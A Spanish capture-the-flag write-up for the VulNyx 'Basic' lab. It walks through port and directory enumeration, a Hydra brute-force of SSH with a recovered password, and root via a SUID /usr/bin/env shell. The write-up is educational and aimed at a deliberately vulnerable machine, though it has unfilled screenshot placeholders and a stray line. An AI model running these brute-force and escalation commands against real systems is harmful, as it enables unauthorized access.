# VulNyx Basic

## 📌 Información

| Campo             | Valor                                               |
| ----------------- | --------------------------------------------------- |
| Plataforma        | VulNyx                                              |
| Máquina           | Basic                                               |
| Dificultad        | Easy                                                |
| Sistema Operativo | Linux                                               |
| Categoría         | Enumeration / Initial Access / Privilege Escalation |

---

# 🎯 Objetivo

Obtener acceso inicial a la máquina **VulNyx Basic** y conseguir privilegios de **root**.

---

# 🛠 Herramientas

* Nmap
* Gobuster
* Hydra
* SSH
* GTFOBins

---

# 🔍 Enumeración

## 1. Descubrimiento del objetivo

Primero identificamos la dirección IP asignada a la máquina VulNyx Basic.
para saber exactamente la ip de la maquina utilizamos la herramienta
barrio de condor777
<img width="1920" height="921" alt="Screenshot_2026-08-19_23_05_16" src="https://github.com/user-attachments/assets/c56a96a7-735a-4cbb-80e5-306d702ed26d" />

<img width="1920" height="921" alt="Screenshot_2026-08-20_01_15_06" src="https://github.com/user-attachments/assets/dd81282f-15cd-46cc-93b8-390f1f71d745" />
identificamos que nuestra ip es la 10.0.2.11

Posteriormente comprobamos la conectividad con la máquina:

<img width="1920" height="921" alt="Screenshot_2026-08-20_01_16_50" src="https://github.com/user-attachments/assets/a51adf43-d0ec-4064-91e0-9026fa53cb5e" />



## 2. Face de escaneo con la herramienta Nmap

Comenzamos realizando un escaneo completo de puertos:

```bash
nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn -vvv ip

### 🔎 Resultados

El escaneo permitió identificar los siguientes servicios:

* **22/tcp** → SSH
* **80/tcp** → HTTP / Apache

### 📸 Resultados de Nmap

> Agregar aquí captura del escaneo Nmap.

---

# 🌐 Enumeración Web

Al encontrar el puerto 80 abierto, accedemos al servidor web:

```text
http://TARGET_IP
```

El servidor muestra una página por defecto de Apache.

### Gobuster

Realizamos enumeración de directorios:

```bash
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt
```

### 🔎 Resultados

Durante la enumeración se encontraron varios recursos interesantes:

```text
/javascript
/secrets
/webdav
```

El recurso `/webdav` requiere autenticación.

Comprobamos la respuesta del servidor:

```bash
curl -i http://TARGET_IP/webdav/
```

El servidor devuelve:

```text
HTTP/1.1 401 Unauthorized
```

Además, se identifica el uso de:

```text
Digest Authentication
```

### 📸 Enumeración Web

> Agregar aquí las capturas de Gobuster y de la respuesta de `/webdav`.

---

# 🔎 Enumeración Adicional

Se continúa investigando la configuración del servidor web y los recursos disponibles.

La página principal de Apache contiene información relacionada con **UserDir**, lo que permite investigar posibles directorios asociados a usuarios.

También se realiza una revisión de los recursos descubiertos durante Gobuster.

El objetivo de esta fase es identificar información que pueda permitir obtener un nombre de usuario válido o credenciales.

---

# 🔐 Descubrimiento de Credenciales

Durante la enumeración se consigue identificar un usuario válido:

```text
Usuario: dimitri
```

Con un nombre de usuario confirmado, se procede a comprobar el servicio SSH.

---

# 💣 Acceso Inicial

El puerto 22 se encuentra abierto y ejecuta SSH.

```bash
ssh dimitri@TARGET_IP
```

Al no disponer inicialmente de la contraseña, se realiza un ataque de fuerza bruta controlado contra el servicio SSH utilizando Hydra.

```bash
hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
```

Se obtienen las siguientes credenciales:

```text
Username: dimitri
Password: mememe
```

Con las credenciales obtenidas se establece una conexión SSH:

```bash
ssh dimitri@TARGET_IP
```

Una vez dentro, comprobamos nuestra identidad:

```bash
whoami
```

Resultado:

```text
dimitri
```

También comprobamos los grupos y privilegios:

```bash
id
```

### 📸 Acceso Inicial

> Agregar aquí captura de la conexión SSH y de `whoami`.

---

# 🔑 Enumeración para Privilege Escalation

Una vez obtenido el acceso inicial, comenzamos a investigar posibles métodos para escalar privilegios.

Primero comprobamos los privilegios sudo:

```bash
sudo -l
```

Después revisamos la información del sistema:

```bash
uname -a
```

También realizamos una búsqueda de archivos con permisos **SUID**:

```bash
find / -perm -4000 -type f 2>/dev/null
```

### 🔎 Hallazgo

Durante la enumeración se identifica el siguiente binario:

```text
/usr/bin/env
```

El binario `env` posee permisos SUID, lo que permite ejecutarlo con los privilegios del propietario del archivo.

---

# 🚀 Explotación del SUID

Se consulta la documentación de **GTFOBins** para comprobar si `env` puede utilizarse para obtener una shell privilegiada.

La técnica permite ejecutar una shell utilizando los privilegios elevados del binario.

Se ejecuta:

```bash
/usr/bin/env /bin/sh
```

Posteriormente verificamos los privilegios:

```bash
whoami
```

Resultado:

```text
root
```

También podemos comprobar:

```bash
id
```

El resultado confirma que hemos obtenido privilegios de administrador.

### 📸 Privilege Escalation

> Agregar aquí captura de la explotación de `env` y del resultado de `whoami`.

---

# 👑 Root Access

Finalmente verificamos el acceso como root:

```bash
whoami
```

Resultado:

```text
root
```

También podemos comprobar el acceso al directorio `/root`:

```bash
cd /root
ls -la
```

La máquina ha sido comprometida exitosamente y se han obtenido privilegios de root.

### 📸 Root

> Agregar aquí captura final demostrando acceso como root.

---

# 🧠 Lecciones Aprendidas

* La importancia de realizar un escaneo completo de puertos.
* La utilidad de `-sC` y `-sV` para identificar servicios y versiones.
* La importancia de enumerar aplicaciones web incluso cuando muestran una página por defecto.
* La utilidad de Gobuster para descubrir directorios y recursos ocultos.
* Cómo identificar mecanismos de autenticación HTTP.
* La importancia de investigar los usuarios y credenciales descubiertos.
* Cómo utilizar Hydra para comprobar credenciales en servicios autorizados.
* La diferencia entre **Initial Access** y **Privilege Escalation**.
* La importancia de buscar archivos SUID después de obtener acceso.
* Cómo un binario aparentemente legítimo como `env` puede representar un riesgo cuando posee permisos SUID.
* La utilidad de GTFOBins para investigar posibles técnicas de abuso de binarios Unix.

---

# 🏁 Conclusión

VulNyx Basic permitió practicar un flujo completo de pentesting sobre un sistema Linux vulnerable.

El proceso comenzó con la enumeración de puertos y servicios mediante Nmap, seguido de la enumeración del servidor web con Gobuster.

Posteriormente se obtuvo acceso inicial mediante SSH utilizando las credenciales descubiertas y se realizó una segunda fase de enumeración desde el sistema comprometido.

Finalmente, se identificó el binario `/usr/bin/env` con permisos SUID y se utilizó para realizar una escalada de privilegios hasta obtener acceso como **root**.

La máquina permitió reforzar conceptos fundamentales de:

**Enumeration → Initial Access → Privilege Escalation → Root**

---

# ⚠️ Disclaimer

Esta máquina fue desarrollada intencionalmente como un entorno vulnerable para practicar técnicas de ciberseguridad.

Todas las técnicas utilizadas en este laboratorio deben realizarse únicamente contra sistemas propios, entornos de laboratorio o sistemas para los cuales se tenga autorización explícita.

